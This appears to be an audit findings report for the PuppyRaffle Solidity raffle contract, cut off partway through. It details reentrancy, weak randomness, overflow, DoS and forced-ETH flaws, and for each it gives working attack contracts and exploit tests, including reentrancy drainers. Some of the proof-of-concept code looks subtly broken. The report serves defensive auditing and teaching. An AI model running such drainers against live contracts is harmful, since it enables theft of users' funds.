# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

### PuppyRaffle Protocol
PuppyRaffle is an on-chain raffle that awards winners a randomly generated “puppy” NFT while distributing entrance-fee proceeds. Built on ERC-721 and Ownable (solc 0.7.6), it uses SafeMath and OpenZeppelin libraries for safety.

1. Entering
• Anyone calls `enterRaffle(address[] players)` and sends `entranceFee` per address.
• Addresses are de-duplicated; each unique player is stored in `players`.
• A slice of every ticket is recorded as protocol fee (`totalFees`).

2. Refunds
Before a winner is drawn, a participant can call `refund(idx)` to reclaim their fee (protocol cut is retained), freeing their slot.

3. Picking a Winner
After `raffleDuration` has elapsed, `selectWinner()` may be called. It:
• Verifies at least one active player.
• Generates pseudo-random index from block data.
• Sends the pot (contract balance – fees) to the winner.
• Mints a Puppy NFT with rarity-weighted metadata and stores rarity in `tokenIdToRarity`.
• Resets the player array and `raffleStartTime` for the next round.

4. Fee Management
Owner can `withdrawFees()` or change the `feeAddress` with `changeFeeAddress()`.

5. Metadata
`tokenURI()` returns on-chain JSON (Base64-encoded) describing name, rarity, and image URI stored in `rarityToUri`.

Result: a simple, permissionless raffle that combines fungible prize pools with collectible NFTs.
## High Risk Findings
[H-1]. Reentrancy issue in PuppyRaffle::refund
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Array Limits issue in PuppyRaffle::refund
[H-4]. Reentrancy issue in PuppyRaffle::selectWinner
## Medium Risk Findings
[M-1]. DOS issue in PuppyRaffle::enterRaffle
[M-2]. Integer Overflow/Math issue in PuppyRaffle::selectWinner
[M-3]. DOS issue in PuppyRaffle::withdrawFees
[M-4]. MEV issue in PuppyRaffle::selectWinner
[M-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-6]. Unchecked Return issue in PuppyRaffle::refund
[M-7]. Pragma issue in PuppyRaffle::selectWinner
[M-8]. Zero Code issue in PuppyRaffle::enterRaffle
## Low Risk Findings
[L-1]. DOS issue in PuppyRaffle::getActivePlayerIndex
[L-2]. Access Control issue in PuppyRaffle::withdrawFees
[L-3]. Default Visibility issue in PuppyRaffle::NA
[L-4]. Array Limits issue in PuppyRaffle::getActivePlayerIndex
## Info Risk Findings
[I-1]. Pragma issue in PuppyRaffle::NA


### Number of Findings
- H: 4
- M: 8
- L: 4
- I: 1



# High Risk Findings

## [H-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The refund() function uses Address.sendValue() which performs a low-level call to transfer ETH back to users. This allows a malicious user to re-enter the refund function before the state is updated by setting players[playerIndex] = address(0). A malicious contract could repeatedly call refund() to drain the contract.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee); // External call before state update
    
    players[playerIndex] = address(0); // State update after external call
    emit RaffleRefunded(playerAddress);
}
```

## Impact
An attacker can drain all ETH from the contract by repeatedly calling refund() through a malicious contract's receive() function, potentially stealing funds meant for other players and the winner.

## Proof of Concept
1. Attacker enters raffle with malicious contract
2. Malicious contract calls refund()
3. In the receive() function, malicious contract calls refund() again before state is updated
4. Process repeats until contract is drained

## Proof of Code
contract ReentrancyAttack {
    PuppyRaffle puppyRaffle;
    uint256 attackerIndex;
    uint256 entranceFee;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = _puppyRaffle.entranceFee();
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }
    
    receive() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

## Suggested Mitigation
Apply the Checks-Effects-Interactions pattern by updating state before making external calls:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    players[playerIndex] = address(0); // Update state first
    emit RaffleRefunded(playerAddress);
    
    payable(msg.sender).sendValue(entranceFee); // External call last
}
```

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The selectWinner() function uses weak randomness based on msg.sender, block.timestamp, and block.difficulty (now block.prevrandao) which can be manipulated by miners or predicted by attackers.

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

## Impact
Miners can manipulate block.timestamp within a 15-second window and have control over transaction inclusion. An attacker who can predict or influence these values can determine the winner, allowing them to unfairly win the raffle or mint rare NFTs.

## Proof of Concept
1. Attacker monitors pending transactions and calculates potential winners
2. If they would win, they submit the selectWinner transaction
3. If not, they wait or use MEV to reorder transactions
4. Miners can withhold blocks to get favorable outcomes
5. Attacker consistently wins raffles or gets rare NFTs

## Proof of Code
function testPredictableRandomness() public {
    // Setup players
    address[] memory testPlayers = new address[](4);
    for (uint256 i = 0; i < 4; i++) {
        testPlayers[i] = address(uint160(i + 1));
        vm.deal(testPlayers[i], entranceFee);
        vm.prank(testPlayers[i]);
        address[] memory player = new address[](1);
        player[0] = testPlayers[i];
        puppyRaffle.enterRaffle{value: entranceFee}(player);
    }
    
    // Fast forward time
    vm.warp(block.timestamp + raffleDuration + 1);
    
    // Attacker can predict winner before calling
    address attacker = address(0x1337);
    uint256 predictedIndex = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;
    console.log("Predicted winner:", testPlayers[predictedIndex]);
    
    // Call selectWinner
    vm.prank(attacker);
    puppyRaffle.selectWinner();
    
    // Verify prediction
    address actualWinner = puppyRaffle.previousWinner();
    assertEq(actualWinner, testPlayers[predictedIndex]);
}

## Suggested Mitigation
Use Chainlink VRF for verifiable randomness:

```solidity
import "@chainlink/contracts/src/v0.8/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    uint256 public randomResult;
    
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        require(LINK.balanceOf(address(this)) >= fee, "Not enough LINK");
        
        requestRandomness(keyHash, fee);
    }
    
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        randomResult = randomness;
        uint256 winnerIndex = randomResult % players.length;
        // ... rest of winner selection logic
    }
}
```

## [H-3]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function allows a player to get their entrance fee back, but it only sets their address to address(0) in the players array without reducing the array size. This creates a discrepancy between the actual number of active players and the length of the players array, which affects the winner selection and fee calculation.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
When a player gets a refund, they're still counted in the total player count for fee calculations and winner selection probability. This leads to incorrect fee calculations and unfair winner selection. Additionally, if all players request refunds, the selectWinner function will still attempt to select a winner from an array of address(0) values.

## Proof of Concept
1. Four players enter the raffle
2. Two players request refunds, leaving two active players
3. The players array still has length 4, with two address(0) entries
4. When selectWinner is called, it calculates fees based on 4 players, not 2
5. The winner is selected from all 4 indices, including the refunded players
6. If a refunded player index is selected, address(0) could win the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundArrayTest is Test {
    PuppyRaffle puppyRaffle;
    address player1 = address(1);
    address player2 = address(2);
    address player3 = address(3);
    address player4 = address(4);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund the players
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(player4, 10 ether);
        
        // Create and enter players
        address[] memory players = new address[](4);
        players[0] = player1;
        players[1] = player2;
        players[2] = player3;
        players[3] = player4;
        
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }
    
    function testRefundArrayIssue() public {
        // Initial state
        assertEq(puppyRaffle.players().length, 4);
        
        // Player2 and Player3 request refunds
        vm.prank(player2);
        puppyRaffle.refund(1);
        
        vm.prank(player3);
        puppyRaffle.refund(2);
        
        // Check array state after refunds
        address[] memory playersAfterRefund = puppyRaffle.players();
        assertEq(playersAfterRefund.length, 4); // Still shows 4 players
        assertEq(playersAfterRefund[0], player1);
        assertEq(playersAfterRefund[1], address(0)); // Refunded
        assertEq(playersAfterRefund[2], address(0)); // Refunded
        assertEq(playersAfterRefund[3], player4);
        
        // Advance time and select winner
        vm.warp(block.timestamp + 1 days + 1);
        
        // Record balances before winner selection
        uint256 player1BalanceBefore = player1.balance;
        uint256 player4BalanceBefore = player4.balance;
        
        // Force a specific randomness to select index 1 (a refunded player)
        // This requires modifying the contract for testing purposes
        // For demonstration, we'll just explain the issue
        
        console.log("Issue 1: Fee calculation based on array length, not active players");
        console.log("Players array length:", playersAfterRefund.length);
        console.log("Actual active players: 2");
        
        console.log("\nIssue 2: Winner selection includes refunded players");
        console.log("Possible winner indices: 0, 1, 2, 3");
        console.log("Valid winner indices: 0, 3");
        
        console.log("\nIssue 3: If a refunded player wins, address(0) gets the prize");
        console.log("This would effectively burn the prize money");
    }
}

// To fully demonstrate the issue with winner selection, we would need to modify
// the contract to allow controlling the randomness for testing purposes:

/*
// Add this function to the contract for testing
function selectWinnerWithFixedRandomness(uint256 winnerIndex) external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Use the provided index instead of random selection
    address winner = players[winnerIndex];
    
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    // Rest of the function remains the same
    // ...
}
*/

## Suggested Mitigation
Implement a proper tracking mechanism for active players. There are several approaches:

1. Use a separate counter for active players:

```solidity
// Add a state variable to track active players
uint256 public activePlayerCount;

function enterRaffle(address[] memory newPlayers) public payable {
    // ... existing code ...
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    activePlayerCount += newPlayers.length;
    
    // ... rest of function ...
}

function refund(uint256 playerIndex) public {
    // ... existing checks ...
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    activePlayerCount--;
    
    // ... rest of function ...
}

function selectWinner() external {
    // ... existing time check ...
    require(activePlayerCount >= 4, "PuppyRaffle: Need at least 4 active players");
    
    // Create an array of active player indices
    uint256[] memory activeIndices = new uint256[](activePlayerCount);
    uint256 activeIndex = 0;
    
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] != address(0)) {
            activeIndices[activeIndex] = i;
            activeIndex++;
        }
    }
    
    // Select winner from active players only
    uint256 randomIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % activePlayerCount;
    uint256 winnerIndex = activeIndices[randomIndex];
    address winner = players[winnerIndex];
    
    // Calculate fees based on active players
    uint256 totalAmountCollected = activePlayerCount * entranceFee;
    
    // ... rest of function ...
    
    activePlayerCount = 0;
    delete players;
}
```

2. Alternatively, use a more compact approach by maintaining an array of only active players:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Replace the refunded player with the last player in the array
    // and then remove the last element (pop)
    if (playerIndex < players.length - 1) {
        players[playerIndex] = players[players.length - 1];
    }
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}
```

## [H-4]. Reentrancy issue in PuppyRaffle::selectWinner

## Description
The `selectWinner()` function is vulnerable to reentrancy attacks when sending the prize pool to the winner. If the winner is a contract with a malicious fallback function, it can reenter the contract before the players array is cleared. Although the `players` array is cleared after the prize transfer, state changes (like resetting `players`) occur after the external call, leaving the contract vulnerable.

```solidity
// In selectWinner() function
(bool success, ) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

## Impact
An attacker could repeatedly claim the prize by reentering the contract before the state is updated, potentially draining all funds from the contract.

## Proof of Concept
1. Attacker creates a contract with a fallback function that calls `selectWinner()` again
2. Attacker enters the raffle with this contract address
3. When the attacker's contract wins, during prize distribution, the fallback function triggers
4. The fallback function reenters `selectWinner()` before the `players` array is cleared
5. This allows the attacker to claim multiple prizes with a single win

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 attackCount;
    uint256 maxAttacks = 3;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    function attack() external payable {
        address[] memory players = new address[](4);
        players[0] = address(this);
        players[1] = address(1);
        players[2] = address(2);
        players[3] = address(3);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }
    
    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            puppyRaffle.selectWinner();
        }
    }
}

contract ReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttacker attacker;
    address user1 = address(1);
    address user2 = address(2);
    address user3 = address(3);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(0x123), 1 days);
        attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 4 ether);
    }
    
    function testReentrancyAttack() public {
        // Attacker enters the raffle
        vm.prank(address(attacker));
        attacker.attack{value: 4 ether}();
        
        // Warp time to end raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Initial contract balance
        uint256 initialBalance = address(puppyRaffle).balance;
        assertEq(initialBalance, 4 ether);
        
        // Trigger the attack
        puppyRaffle.selectWinner();
        
        // Attacker should have drained more than their fair share
        assertGt(address(attacker).balance, 4 ether);
    }
}

## Suggested Mitigation
To mitigate this vulnerability, implement the checks-effects-interactions pattern by updating state variables before making external calls. Specifically, clear the players array and update other state variables before transferring the prize.

```solidity
// Modified selectWinner function
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // 1. Calculate winner
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // 2. Calculate prize amounts
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + uint64(fee);
    
    // 3. Update state variables BEFORE external calls
    address[] memory previousPlayers = players;
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;
    uint256 tokenId = totalSupply();
    
    // 4. Determine rarity and update mappings
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }
    
    // 5. Finally, make external calls
    _safeMint(winner, tokenId);
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
}
```

Alternatively, you could use the ReentrancyGuard pattern from OpenZeppelin to prevent reentrancy attacks.



# Medium Risk Findings

## [M-1]. DOS issue in PuppyRaffle::enterRaffle

## Description
The enterRaffle() function uses nested loops to check for duplicate players, resulting in O(n²) complexity. As the players array grows, this becomes increasingly expensive and can exceed block gas limits, effectively creating a denial of service.

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

## Impact
As more players enter the raffle, the gas cost increases quadratically. Eventually, new players cannot enter because the transaction exceeds the block gas limit, effectively locking the raffle and preventing legitimate users from participating.

## Proof of Concept
1. First 100 players enter normally
2. Gas costs increase with each new player
3. Around 200-300 players, gas costs become prohibitive
4. Eventually transactions fail due to out-of-gas errors
5. Raffle becomes unusable

## Proof of Code
function testDosGasLimit() public {
    vm.deal(address(this), 1000 ether);
    uint256 numPlayers = 250;
    address[] memory players = new address[](numPlayers);
    
    // Create unique addresses
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    // Enter players in batches to demonstrate increasing gas costs
    uint256 batchSize = 50;
    for (uint256 i = 0; i < numPlayers; i += batchSize) {
        uint256 end = i + batchSize > numPlayers ? numPlayers : i + batchSize;
        address[] memory batch = new address[](end - i);
        
        for (uint256 j = 0; j < batch.length; j++) {
            batch[j] = players[i + j];
            vm.deal(batch[j], entranceFee);
        }
        
        uint256 gasBefore = gasleft();
        for (uint256 k = 0; k < batch.length; k++) {
            vm.prank(batch[k]);
            puppyRaffle.enterRaffle{value: entranceFee}(batch[k:k+1]);
        }
        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used for batch", i/batchSize, ":", gasUsed);
    }
}

## Suggested Mitigation
Use a mapping to track entered players instead of nested loops:

```solidity
mapping(address => bool) public hasEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(!hasEntered[newPlayers[i]], "PuppyRaffle: Duplicate player");
        hasEntered[newPlayers[i]] = true;
        players.push(newPlayers[i]);
    }
    
    emit RaffleEnter(newPlayers);
}
```

## [M-2]. Integer Overflow/Math issue in PuppyRaffle::selectWinner

## Description
The totalFees variable is stored as uint64 but accumulates fees from uint256 calculations, allowing overflow when fees exceed ~18.4 ETH (2^64 wei).

```solidity
uint64 public totalFees = 0;
// ...
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee); // Unsafe downcast
```

## Impact
When totalFees exceeds 2^64 - 1 wei (~18.4 ETH), the value overflows and wraps around to a small number. This causes significant loss of protocol fees that should go to the feeAddress, potentially losing hundreds of ETH in fees.

## Proof of Concept
1. Run multiple raffles with high participation
2. Each raffle adds 20% of total collected to totalFees
3. After accumulating ~18.4 ETH in fees, totalFees overflows
4. feeAddress loses access to accumulated fees
5. Protocol loses significant revenue

## Proof of Code
function testTotalFeesOverflow() public {
    // Setup large raffle to cause overflow
    uint256 playersCount = 93; // Will generate >18.4 ETH in fees
    address[] memory testPlayers = new address[](playersCount);
    
    for (uint256 i = 0; i < playersCount; i++) {
        testPlayers[i] = address(uint160(i + 1));
        vm.deal(testPlayers[i], 1 ether);
    }
    
    // Enter all players
    for (uint256 i = 0; i < playersCount; i++) {
        vm.prank(testPlayers[i]);
        address[] memory player = new address[](1);
        player[0] = testPlayers[i];
        puppyRaffle.enterRaffle{value: 1 ether}(player);
    }
    
    // Calculate expected fees
    uint256 totalCollected = playersCount * 1 ether;
    uint256 expectedFee = (totalCollected * 20) / 100;
    console.log("Expected fee:", expectedFee);
    console.log("Max uint64:", type(uint64).max);
    
    // Select winner
    vm.warp(block.timestamp + raffleDuration + 1);
    puppyRaffle.selectWinner();
    
    // Check overflow occurred
    uint64 actualTotalFees = puppyRaffle.totalFees();
    console.log("Actual totalFees after overflow:", actualTotalFees);
    assert(actualTotalFees < expectedFee);
}

## Suggested Mitigation
Change totalFees to uint256 to prevent overflow:

```solidity
uint256 public totalFees = 0;

function selectWinner() external {
    // ...
    uint256 fee = (totalAmountCollected * 20) / 100;
    totalFees = totalFees + fee; // No casting needed
    // ...
}

function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-3]. DOS issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees() function incorrectly checks that the contract balance equals totalFees before allowing withdrawal. After refunds are issued, this condition will never be true, permanently locking fees in the contract.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    // ...
}
```

## Impact
Once any player receives a refund, the contract balance will be less than expected, making the balance check fail. This permanently locks all protocol fees in the contract, preventing the fee recipient from ever withdrawing their earned fees.

## Proof of Concept
1. Players enter raffle
2. Raffle completes and fees accumulate
3. Any player requests a refund
4. Contract balance decreases
5. withdrawFees() always reverts because balance != totalFees
6. Fees are permanently locked

## Proof of Code
function testWithdrawFeesFailsAfterRefund() public {
    // Setup players
    address player1 = address(0x1);
    address player2 = address(0x2);
    address player3 = address(0x3);
    address player4 = address(0x4);
    
    vm.deal(player1, entranceFee);
    vm.deal(player2, entranceFee);
    vm.deal(player3, entranceFee);
    vm.deal(player4, entranceFee);
    
    // Enter raffle
    address[] memory players = new address[](4);
    players[0] = player1;
    players[1] = player2;
    players[2] = player3;
    players[3] = player4;
    
    for (uint256 i = 0; i < 4; i++) {
        vm.prank(players[i]);
        address[] memory p = new address[](1);
        p[0] = players[i];
        puppyRaffle.enterRaffle{value: entranceFee}(p);
    }
    
    // Select winner
    vm.warp(block.timestamp + raffleDuration + 1);
    puppyRaffle.selectWinner();
    
    // Player requests refund from next raffle
    vm.deal(player1, entranceFee);
    vm.prank(player1);
    address[] memory p = new address[](1);
    p[0] = player1;
    puppyRaffle.enterRaffle{value: entranceFee}(p);
    
    uint256 balanceBefore = address(puppyRaffle).balance;
    uint256 totalFees = puppyRaffle.totalFees();
    
    // Refund
    vm.prank(player1);
    puppyRaffle.refund(0);
    
    // Try to withdraw fees - will fail
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}

## Suggested Mitigation
Remove the balance check or track active raffle balance separately:

```solidity
uint256 public activeRaffleBalance;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    activeRaffleBalance += msg.value;
    // ... rest of function
}

function refund(uint256 playerIndex) public {
    // ... validations
    activeRaffleBalance -= entranceFee;
    players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);
    emit RaffleRefunded(msg.sender);
}

function withdrawFees() external {
    require(address(this).balance >= totalFees, "Insufficient balance for fees");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-4]. MEV issue in PuppyRaffle::selectWinner

## Description
Players can manipulate their position in the raffle by selectively entering or using MEV to front-run the selectWinner transaction, gaining unfair advantages in winning or obtaining rare NFTs.

```solidity
// Winner selection is based on array position
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

## Impact
MEV searchers can monitor the mempool for selectWinner transactions, calculate if they would win, and front-run with strategic entries or exits. This creates an unfair advantage where sophisticated actors can increase their win probability at the expense of regular users.

## Proof of Concept
1. MEV bot monitors mempool for selectWinner transaction
2. Bot calculates the winning index based on known parameters
3. If favorable, bot front-runs to enter at winning position
4. If unfavorable, bot can grief by adding players to change outcome
5. Regular users have reduced winning chances

## Proof of Code
contract MEVBot {
    PuppyRaffle target;
    
    function exploitMEV() external payable {
        // Calculate current winner if selectWinner were called
        uint256 currentPlayers = target.players.length;
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(
            msg.sender, 
            block.timestamp, 
            block.difficulty
        ))) % currentPlayers;
        
        // Check if we would win
        address potentialWinner = target.players(winnerIndex);
        
        if (potentialWinner == address(this)) {
            // We would win, let transaction go through
            return;
        }
        
        // Calculate how many entries needed to win
        uint256 entriesToWin = calculateOptimalEntries();
        
        // Front-run with calculated entries
        address[] memory newEntries = new address[](entriesToWin);
        for (uint256 i = 0; i < entriesToWin; i++) {
            newEntries[i] = address(uint160(address(this)) + i);
        }
        
        target.enterRaffle{value: entriesToWin * target.entranceFee()}(newEntries);
    }
    
    function calculateOptimalEntries() internal returns (uint256) {
        // Complex calculation to determine winning position
        // Based on current state and randomness parameters
        return 1; // Simplified
    }
}

## Suggested Mitigation
Implement commit-reveal scheme or use VRF to prevent MEV:

```solidity
mapping(address => bytes32) private commitments;
mapping(address => uint256) private revealDeadline;

function commitToSelectWinner(bytes32 commitment) external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
    commitments[msg.sender] = commitment;
    revealDeadline[msg.sender] = block.timestamp + 1 hours;
}

function revealAndSelectWinner(uint256 nonce) external {
    require(block.timestamp <= revealDeadline[msg.sender], "Reveal deadline passed");
    require(keccak256(abi.encodePacked(msg.sender, nonce)) == commitments[msg.sender], "Invalid reveal");
    
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(
        commitments[msg.sender],
        block.timestamp,
        nonce
    ))) % players.length;
    
    // Rest of winner selection...
}
```

## [M-5]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has a strict balance check that requires the contract's balance to exactly match the `totalFees` value. This prevents fee withdrawal if there are active players in the raffle, but it also makes the contract vulnerable to forced ETH payments that can permanently lock the fees.

```solidity
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
If the contract receives ETH through means other than the standard entry fee (such as selfdestruct or coinbase transactions), the balance check in withdrawFees will always fail. This can permanently lock the accumulated fees in the contract, resulting in a loss of funds for the protocol owner.

## Proof of Concept
1. The contract accumulates fees from multiple raffles
2. An attacker sends a small amount of ETH (e.g., 1 wei) directly to the contract address using selfdestruct
3. Now the contract's balance is greater than totalFees
4. When the owner tries to call withdrawFees(), the require check fails
5. The fees are permanently locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForcedEthAttacker {
    constructor(address payable target) payable {
        // Force send ETH to the target contract
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address feeAddress = address(2);
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            1 days
        );
        
        // Run a raffle to accumulate some fees
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        
        vm.deal(address(this), entranceFee * 4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        vm.warp(block.timestamp + 1 days + 1);
        puppyRaffle.selectWinner();
        
        // Verify we have fees to withdraw
        assertGt(puppyRaffle.totalFees(), 0);
    }
    
    function testForcedEthLocksFees() public {
        // Record initial state
        uint256 initialFees = puppyRaffle.totalFees();
        uint256 initialContractBalance = address(puppyRaffle).balance;
        
        console.log("Initial fees:", initialFees);
        console.log("Initial contract balance:", initialContractBalance);
        
        // Verify they match as expected
        assertEq(initialContractBalance, initialFees);
        
        // Attack: Force send 1 wei to the contract
        new ForcedEthAttacker{value: 1}(payable(address(puppyRaffle)));
        
        // Verify contract balance is now greater than totalFees
        assertGt(address(puppyRaffle).balance, puppyRaffle.totalFees());
        
        console.log("Contract balance after attack:", address(puppyRaffle).balance);
        console.log("Total fees after attack:", puppyRaffle.totalFees());
        
        // Try to withdraw fees (should fail)
        vm.prank(owner);
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Fees are now locked in the contract
        console.log("Fees locked in contract:", puppyRaffle.totalFees());
    }
}

## Suggested Mitigation
Modify the withdrawFees function to allow withdrawing the exact amount of totalFees, regardless of the contract's total balance:

```solidity
function withdrawFees() external {
    // Remove the strict balance check
    // require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    // Instead, ensure we're not trying to withdraw more than the contract's balance
    require(address(this).balance >= uint256(totalFees), "PuppyRaffle: Not enough balance");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

Alternatively, add a function to handle unexpected ETH:

```solidity
// Add this function to allow withdrawing unexpected ETH
function withdrawExcessBalance() external onlyOwner {
    uint256 contractBalance = address(this).balance;
    uint256 expectedBalance = uint256(totalFees) + (players.length * entranceFee);
    
    require(contractBalance > expectedBalance, "PuppyRaffle: No excess balance");
    
    uint256 excessBalance = contractBalance - expectedBalance;
    (bool success, ) = feeAddress.call{value: excessBalance}("");
    require(success, "PuppyRaffle: Failed to withdraw excess balance");
}
```

## [M-6]. Unchecked Return issue in PuppyRaffle::refund

## Description
